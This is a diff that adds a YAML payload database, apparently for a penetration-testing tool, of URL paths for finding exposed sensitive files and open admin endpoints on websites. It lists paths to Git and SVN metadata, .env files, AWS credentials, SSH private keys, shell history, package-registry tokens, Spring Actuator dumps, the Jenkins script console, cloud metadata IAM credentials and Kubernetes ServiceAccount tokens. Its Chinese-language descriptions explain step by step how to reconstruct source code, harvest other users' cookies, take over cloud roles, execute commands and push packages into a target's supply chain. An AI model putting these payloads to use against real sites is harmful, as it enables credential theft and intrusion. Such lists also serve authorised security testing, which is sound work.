@@ -1,0 +1,560 @@
+ruleDB: v0.1.0
+# 敏感信息泄露模板。载荷是**路径**（content_type: file-path），不是完整请求——
+# 请求由输出层渲染（提交方式选「URL 路径」或「URL 参数」都行）。
+#
+# 这一类和路径穿越**不是一回事**：下面的载荷一个 `../` 都没有，它们不需要穿越，
+# 是文件本来就被部署到了 Web 目录、能被直接请求。所以 requires 里没有
+# file-priv / include-sink 这类键，只有「目标为什么会让它可访问」：
+#
+#   vcs-exposed          .git / .svn / .hg 被部署上去（版本控制元数据那一组）
+#   debug-endpoint-open  actuator / swagger / 控制台 / phpinfo 没做鉴权
+#   cloud                云元数据那一组：那些路径只在目标跑在云上时才存在
+#   weak-hardening       其余全部：备份、dotenv、凭据、框架配置、打包文件落在
+#                        Web 目录，归到底都是加固不到位
+#
+# **文件名做成槽位，不是一条模板一个文件**：/.git/config 与 /.git/HEAD 是同一族，
+# 同族的合成一条用槽位选，否则光这些常见路径就能把文件撑到三十条。
+# 槽位名统一用 file（展示成「目标文件」）——每个选项就是一条要照抄的完整路径。
+#
+# 只有 config.custom 用变量：框架特有的路径（WEB-INF/web.xml 这类）穷举不完，
+# 留给用户填。变量没默认值，漏填时保留 <<filepath>> 字面量（契约 3）。
+
+templates:
+  # ---------------------------------------------------------------- 版本控制元数据
+  # 这三条的前提都是「元数据目录跟着站点一起部署了」。拉全量目录后能还原源码——
+  # 单独下某个文件往往只是确认「它真的在」，别把 200 当成源码已到手。
+
+  - id: leak.generic.vcs.git
+    name: Git 元数据文件
+    desc: 目标把 .git 目录整个部署到 Web 目录时用；config 能读到远端地址与分支名，HEAD 指向当前分支，index 是二进制索引、单下没用——要配 git-dumper 把整个 .git 拉下来再还原源码
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      file:
+        options: ["/.git/config", "/.git/HEAD", "/.git/index"]
+        default: "/.git/config"
+    body: "<<file>>"
+    vars: []
+    requires: [vcs-exposed]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: leak.generic.vcs.svn
+    name: SVN 元数据文件
+    desc: .svn 目录暴露时用；entries 是 1.7 以前的明文 XML，wc.db 是 SQLite 库、要用 sqlite3 打开看 NODES 表里的仓库路径。1.7 以后只剩 wc.db，按目标版本挑对应那个
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      file:
+        options: ["/.svn/entries", "/.svn/wc.db"]
+        default: "/.svn/entries"
+    body: "<<file>>"
+    vars: []
+    requires: [vcs-exposed]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: leak.generic.vcs.hg
+    name: Mercurial 元数据文件
+    desc: .hg 目录暴露时用；requires 是纯文本，能确认这里真是 Mercurial 仓库、用的哪种存储格式，之后按格式拉 store 目录还原。命中率比 .git 低得多，扫到再深入
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    body: /.hg/requires
+    vars: []
+    requires: [vcs-exposed]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---------------------------------------------------------------- 配置与凭据
+  # dotenv、编辑器备份、云凭据、shell 历史：共同点是「本不该出现在 Web 根目录下」。
+  # 拿到任意一条基本等于拿到账号，比读源码更直接。
+
+  - id: leak.generic.config.env
+    name: .env 环境文件
+    desc: dotenv 文件被部署到 Web 目录时用，里面是数据库口令和各类 API key；先试 .env，404 再试 .env.backup、.env.local 这类部署脚本和编辑器留下的副本，以及 .env.production / .env.staging 这种按环境拆的写法（框架在对应环境下只加载自己那一份，主 .env 里反而可能是空壳）
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      file:
+        options: ["/.env", "/.env.backup", "/.env.local", "/.env.production", "/.env.staging", "/.env.dev"]
+        default: "/.env"
+    body: "<<file>>"
+    vars: []
+    requires: [weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: leak.generic.config.backup
+    name: 配置与编辑器备份文件
+    desc: 源码或配置的副本落在 Web 目录时用；.bak 与结尾的波浪号是编辑器和部署脚本留下的，web.config 被当静态文件下载时能读到连接串，.DS_Store 会泄露同目录的文件名清单
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      file:
+        options: ["/config.php.bak", "/wp-config.php~", "/web.config", "/.DS_Store"]
+        default: "/config.php.bak"
+    body: "<<file>>"
+    vars: []
+    requires: [weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: leak.generic.config.credential
+    name: 凭据与历史文件
+    desc: 家目录被当成 Web 根目录、或部署时把 .aws 与 .ssh 一起拷进去时用；AWS 凭据能直接接管云账号，私钥要确认没有口令保护，bash_history 里常留着明文口令和连接串
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      file:
+        options: ["/.aws/credentials", "/id_rsa", "/.ssh/id_rsa", "/.bash_history"]
+        default: "/.aws/credentials"
+    body: "<<file>>"
+    vars: []
+    requires: [weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: leak.generic.config.ci
+    name: 构建与编排文件
+    desc: 仓库根目录被整个部署上去时用；流水线与编排文件里常写着镜像仓库口令、环境变量清单和内部主机名，是拿不下 .env 时的替代目标，顺带能摸出目标的部署结构
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      file:
+        options: ["/.gitlab-ci.yml", "/docker-compose.yml", "/Dockerfile", "/.travis.yml"]
+        default: "/.gitlab-ci.yml"
+    body: "<<file>>"
+    vars: []
+    requires: [weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---------------------------------------------------------------- 调试 / 管理端点
+  # 这一类不是「文件被误放」，是「功能被打开了却没做鉴权」。分组按组件走，
+  # 因为同一组里的端点属于同一个应用，开了一个通常就有另一个。
+
+  - id: leak.generic.debug.actuator
+    name: Spring Boot Actuator 端点
+    desc: 目标开了 Actuator 且没做鉴权时用；/actuator 先看哪些端点开放，env 直接吐明文配置（含数据源口令），heapdump 是堆转储、下载后用 MAT 或 strings 挖内存里的密钥——它可能上百 MB，窄带宽上别随手拉
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      file:
+        options: ["/actuator", "/actuator/env", "/actuator/heapdump"]
+        default: "/actuator"
+    body: "<<file>>"
+    vars: []
+    requires: [debug-endpoint-open]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: leak.generic.debug.apidoc
+    name: 接口文档端点
+    desc: 接口文档没做鉴权时用；swagger-ui.html 是可视化页面，v2/api-docs 是它背后的 JSON——直接拿 JSON 更省事，里面列着全部路径、参数和模型，未公开的管理接口常在这里露出来
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      file:
+        options: ["/swagger-ui.html", "/v2/api-docs"]
+        default: "/swagger-ui.html"
+    body: "<<file>>"
+    vars: []
+    requires: [debug-endpoint-open]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: leak.generic.debug.phpinfo
+    name: phpinfo 探查文件
+    desc: 探查文件被留在 Web 目录时用；能读到绝对路径、PHP 版本、已装扩展和 php.ini 里的敏感项，是后面挑文件包含与上传绕过方式的依据。disable_functions 设了也照吐不误
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      file:
+        options: ["/phpinfo.php", "/info.php"]
+        default: "/phpinfo.php"
+    body: "<<file>>"
+    vars: []
+    requires: [debug-endpoint-open]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: leak.generic.debug.console
+    name: 调试控制台端点
+    desc: 开发期控制台被带上了生产时用；/console 是 H2 的 Web 控制台、能直接跑 SQL 读写库（JDBC URL 可以从 actuator/env 里抄），/druid/index.html 是 Druid 监控页、泄露全部 SQL 与 URI。两条都只在目标真开了对应组件时存在
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      file:
+        options: ["/console", "/druid/index.html"]
+        default: "/console"
+    body: "<<file>>"
+    vars: []
+    requires: [debug-endpoint-open]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---------------------------------------------------------------- 备份包与导出
+  # 打包备份与数据库导出：一条顶前面好几条，但只有在部署时顺手把包留在 Web 目录才存在。
+
+  - id: leak.generic.backup.webroot
+    name: 整站打包备份
+    desc: 整站打包备份被留在 Web 目录时用；拿下就是全量源码，含硬编码口令与配置。路径按目标实际命名试，同构的还有 wwwroot.zip、backup.tar.gz 这类写法
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      file:
+        options: ["/www.zip", "/web.tar.gz", "/wwwroot.rar"]
+        default: "/www.zip"
+    body: "<<file>>"
+    vars: []
+    requires: [weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: leak.generic.backup.sql
+    name: 数据库导出文件
+    desc: 数据库导出被留在 Web 目录时用；包里是建表语句与全量数据，账号哈希和业务数据一次到手。文件常很大，先看响应头的 Content-Length 再决定要不要下
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      file:
+        options: ["/backup.sql", "/db.sql"]
+        default: "/backup.sql"
+    body: "<<file>>"
+    vars: []
+    requires: [weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---------------------------------------------------------------- 自定义路径
+
+  - id: leak.generic.config.custom
+    name: 自定义敏感路径
+    desc: 已经知道目标用了什么框架、或踩到过它的命名习惯时用；filepath 填完整路径（含前导斜杠），例如 /.htpasswd、/WEB-INF/web.xml、/appsettings.json、/.git-credentials。不确定路径时先跑同族的字典模板，别在这条上盲猜
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    body: "<<filepath>>"
+    vars: [filepath]
+    requires: [weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---------------------------------------------------------------- 版本控制元数据（续）
+  # 上面那三条是「确认元数据在不在」，这两条是「已经确认在了、继续挖」。
+  # 前提仍然是 vcs-exposed，别的什么都没变。
+
+  - id: leak.generic.vcs.git_refs
+    name: Git reflog 与引用文件
+    desc: 已确认 .git 可读、想找出「历史里提交过又删掉的东西」时用；logs/HEAD 是本地 reflog，能看到每次提交、重置、切换的 SHA 与操作人邮箱，packed-refs 是所有分支与标签的完整清单（比逐个猜 refs/heads/名字 省事），COMMIT_EDITMSG 留着最后一次提交信息。这些都是纯文本、比 index 与 pack 文件好读，但只有配合 git-dumper 拉全量才能真正还原源码——单独读几个文本文件只能确认「它真的在」
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      file:
+        options: ["/.git/logs/HEAD", "/.git/packed-refs", "/.git/COMMIT_EDITMSG", "/.git/refs/heads/master"]
+        default: "/.git/logs/HEAD"
+    body: "<<file>>"
+    vars: []
+    requires: [vcs-exposed]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: leak.generic.vcs.svn_pristine
+    name: SVN pristine 原文库与工作副本元数据
+    desc: SVN 1.7 以后源码原文全放在 .svn/pristine 下、按内容的 SHA-1 命名（形如 pristine/ab/abcd….svn-base），所以**光下目录名没用**——要么目标开着目录列表，要么先从 wc.db 的 NODES 表里读出 checksum 再拼出具体文件名。1.7 以前的版本原文在 .svn/text-base/*.svn-base，路径不一样。all-wcprops 与 format 只说明工作副本的格式版本，价值在于确认版本号、好挑对应那一种路径
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      file:
+        options: ["/.svn/pristine/", "/.svn/all-wcprops", "/.svn/format", "/.svn/text-base/"]
+        default: "/.svn/pristine/"
+    body: "<<file>>"
+    vars: []
+    requires: [vcs-exposed]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: leak.generic.vcs.misc
+    name: 其它版本控制的元数据（Hg store / CVS / Bazaar）
+    desc: 目标用的不是 git 或 svn 时逐条试；.hg/store 才是 Mercurial 的实际数据目录（/.hg/requires 只说明它用的哪种存储格式、是个引子），CVS/Entries 是每个目录一份的版本清单、CVS/Root 写着仓库地址（顺着能去连中心库），.bzr/README 只能证明这是 Bazaar 仓库。命中率比 .git 低得多，扫到再深入、别在这上面耗时间
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      file:
+        options: ["/.hg/store/", "/CVS/Entries", "/CVS/Root", "/.bzr/README"]
+        default: "/.hg/store/"
+    body: "<<file>>"
+    vars: []
+    requires: [vcs-exposed]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---------------------------------------------------------------- 框架配置与仓库凭据
+  # 与上面那组 config.* 的分工：那一组是「家目录/仓库根被部署上去」，这一组是
+  # 「把源码目录（而不是打包产物）当成了 Web 根目录」。命中一条通常意味着源码也能一起读走。
+
+  - id: leak.generic.config.framework
+    name: 框架配置文件（Rails / Django / Spring）
+    desc: 部署时把源码目录当 Web 根目录（而不是只放静态产物）时用；Rails 的 config/database.yml 与 config/secrets.yml 里是数据库口令和 secret_key_base，Django 的 settings.py 里是 SECRET_KEY 与数据库配置（它通常在项目包内，路径要按目标的目录名调整），Spring 的 application.properties / application.yml 里是数据源与各类凭据。这几个都是「读到就等于拿到密钥」，比读源码更直接
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      file:
+        options: ["/config/database.yml", "/config/secrets.yml", "/settings.py", "/application.properties", "/application.yml"]
+        default: "/config/database.yml"
+    body: "<<file>>"
+    vars: []
+    requires: [weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: leak.generic.config.registry
+    name: 包管理器与镜像仓库凭据
+    desc: 家目录或构建上下文被一起部署上去时用；.npmrc 与 .pypirc 里常写着 registry 的 _authToken / pypi 口令（明文或可解的 base64），.dockercfg 与 .docker/config.json 里是镜像仓库的 auth，.gem/credentials 是 rubygems 的 key，.netrc 是 FTP/HTTP 的机器账号口令。拿到任意一条就能往目标依赖的仓库里推包或拉私有镜像——这是横向到供应链最近的一条路
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      file:
+        options: ["/.npmrc", "/.pypirc", "/.dockercfg", "/.docker/config.json", "/.gem/credentials", "/.netrc"]
+        default: "/.npmrc"
+    body: "<<file>>"
+    vars: []
+    requires: [weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---------------------------------------------------------------- 调试 / 管理端点（续）
+  # 与上面 debug.* 那三条的分工：那三条是「先看哪些端点开着」，这几条是
+  # 「端点在、继续往里挖」。前提同样是 debug-endpoint-open。
+
+  - id: leak.generic.debug.actuator_ops
+    name: Actuator 观测与配置端点
+    desc: 已确认 /actuator 可读、想再挖深一层时用；httptrace 留着最近若干次请求的完整头，里面常带 Authorization 与 Cookie（等于白拿别人的凭据，命中率最高），mappings 列出全部 URL 与处理类、等于一份内部接口清单，configprops 是全部 @ConfigurationProperties、常含明文口令，beans 与 threaddump 体量大、先看 Content-Length。loggers 特殊：读它只是拿到当前日志级别，**用 POST 打同一个路径还能改级别**——这个工具给的是路径，改级别要自己发 POST
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      file:
+        options: ["/actuator/httptrace", "/actuator/mappings", "/actuator/configprops", "/actuator/loggers", "/actuator/beans", "/actuator/threaddump", "/actuator/scheduledtasks"]
+        default: "/actuator/httptrace"
+    body: "<<file>>"
+    vars: []
+    requires: [debug-endpoint-open]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: leak.generic.debug.graphql
+    name: GraphQL 端点与内省查询
+    desc: 目标用 GraphQL 且没关内省时用；开着内省等于把整个 schema（含未公开的 mutation 与内部字段）交出来，关掉了也还能靠字段名报错逐字猜。带查询串那条把内省查询直接拼在路径里发，很多实现对 GET 查询照收；被拦就把查询放进请求体、用 JSON 提交方式发。GraphiQL 是自带文档与自动补全的网页控制台，能打开就等于拿到了 schema。路径不一定在 /graphql，按目标前端实际请求的那个改
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      ep:
+        options:
+          - {id: bare,       name: "只探端点是否存在",                             path: "/graphql"}
+          - {id: introspect, name: "带内省查询串（一次拿到全部类型与字段）",        path: "/graphql?query={__schema{types{name}}}"}
+          - {id: v1,         name: "常见变体路径",                                 path: "/v1/graphql"}
+          - {id: console,    name: "GraphiQL 网页控制台（浏览器里直接写查询）",     path: "/graphiql"}
+        default: bare
+    body: "<<ep.path>>"
+    vars: []
+    requires: [debug-endpoint-open]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: leak.generic.debug.search
+    name: 搜索引擎与索引服务的未鉴权端点
+    desc: 目标是 Elasticsearch 或 Solr 且没配鉴权时用（内网暴露的 ES 是最常见的一类数据泄露）；_cat/indices 列出全部索引名与文档数，_cluster/health 与 _nodes 说明规模与版本，_search 不带条件会直接吐数据，Solr 的 /solr/admin/ 是自带查询界面的控制台。这些端点默认对 GET 一律放行，命中后先看索引名再决定拉哪个，别一上来就 _search
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      file:
+        options: ["/_cat/indices", "/_cluster/health", "/_nodes", "/_search?size=1", "/solr/admin/", "/solr/admin/cores"]
+        default: "/_cat/indices"
+    body: "<<file>>"
+    vars: []
+    requires: [debug-endpoint-open]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: leak.generic.debug.jenkins
+    name: Jenkins 脚本控制台与管理页
+    desc: Jenkins 没做鉴权、或匿名用户有 Overall/Read 权限时用；/script 是 Groovy 脚本控制台，粘一段 println 加 .execute() 就是命令执行，是拿到 Jenkins 后最直接的一条路——但它收的是 POST 表单，这里给的是路径，真正利用要自己发 POST。/manage 与 /systemInfo 至少能读到版本、插件列表与环境变量（常含凭据）。Jenkins 装在 /jenkins 子路径下就用带前缀的那两个，路径不对会 404 而不是 403，别据此判断它不存在
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      file:
+        options: ["/script", "/jenkins/script", "/manage", "/jenkins/manage", "/jenkins/systemInfo"]
+        default: "/script"
+    body: "<<file>>"
+    vars: []
+    requires: [debug-endpoint-open]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---------------------------------------------------------------- 备份包（组合写法）
+  # 备份文件的命名只有「词干 + 后缀」两个自由度，所以这里拆成两个槽位自由组合，
+  # 而不是把几十个组合写死成选项——目标是哪个站名、用的哪种压缩，事先都不知道。
+  # 组合里会有不成立的路径（比如 /db.rar），那是这个写法的代价：
+  # 它换来的是「不用改数据文件就能凑出目标的命名」。
+
+  - id: leak.generic.backup.combo
+    name: 备份文件名的词干与后缀组合
+    desc: 整站打包与数据库导出的路径按「词干 + 后缀」自由组合，先用默认的 /backup.zip，404 再按目标站名换词干、按压缩方式换后缀。'~' 结尾是编辑器与 cp 留下的单文件备份（只对文件成立、不会有 .tar.gz~ 这种组合），'.tar.gz' 是两段后缀、要选中那一个选项而不是拼 .gz。命中后先看响应头的 Content-Length——整站包动辄几百 MB，窄带宽上别随手拉
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      stem:
+        options: ["/backup", "/www", "/web", "/db", "/site", "/app", "/data"]
+        default: "/backup"
+      ext:
+        options: [".zip", ".tar.gz", ".tar", ".rar", ".7z", ".sql", ".bak", ".old", "~", ".gz"]
+        default: ".zip"
+    body: "<<stem>><<ext>>"
+    vars: []
+    requires: [weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---------------------------------------------------------------- 云与容器
+  # 与 ssrf 那边的分工：那里打的是「让目标去请求元数据地址」，这里放的是
+  # **Web 上能直接请求到**的形态——应用自己做了个反向代理、容器网络里元数据服务
+  # 直接可达、或者 Web 根目录被设成了 /。
+
+  - id: leak.generic.cloud.metadata
+    name: 云元数据端点（Web 可直接访问的形态）
+    desc: >-
+      目标把云元数据服务通过 Web 暴露出来时用——应用自己写了个取实例信息的代理、或容器网络里
+      169.254.169.254 直接可达。AWS 的 /latest/meta-data/ 先看目录，iam/security-credentials/
+      下那个角色的临时凭据是真正值钱的东西（AccessKeyId、SecretAccessKey、Token 三件套，
+      等于直接接管这个角色）；GCP 走 computeMetadata/v1 且**必须带 Metadata-Flavor 头、
+      值填 Google**（用请求头提交方式补上），Azure 走 /metadata/instance。
+      只在云上成立，所以前提是「目标运行在云上」
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      file:
+        options: ["/latest/meta-data/", "/latest/meta-data/iam/security-credentials/", "/computeMetadata/v1/instance/service-accounts/default/token", "/metadata/instance/compute", "/metadata/v1/"]
+        default: "/latest/meta-data/"
+    body: "<<file>>"
+    vars: []
+    requires: [cloud]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: leak.generic.cloud.container
+    name: 容器编排凭据（kubeconfig 与 ServiceAccount）
+    desc: 仓库或家目录被整个部署上去时，先试前两条——kubeconfig 与 ~/.kube/config 里带着集群地址与客户端证书（常是 cluster-admin），拿到就能直接对集群发指令。后三条是 **Pod 里的绝对路径**，只有当 Web 根目录被错设成 /（Dockerfile 里 COPY . / 配 WORKDIR / 这类）时才能按 URL 直接请求；正常情况下那不是 URL、是文件系统路径，得配合路径穿越或文件读取漏洞。ServiceAccount 的 token 是一段 JWT，能用它去对 API Server 认证
+    vuln: [leak]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      file:
+        options: ["/kubeconfig", "/.kube/config", "/var/run/secrets/kubernetes.io/serviceaccount/token", "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt", "/etc/kubernetes/admin.conf"]
+        default: "/kubeconfig"
+    body: "<<file>>"
+    vars: []
+    requires: [weak-hardening]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
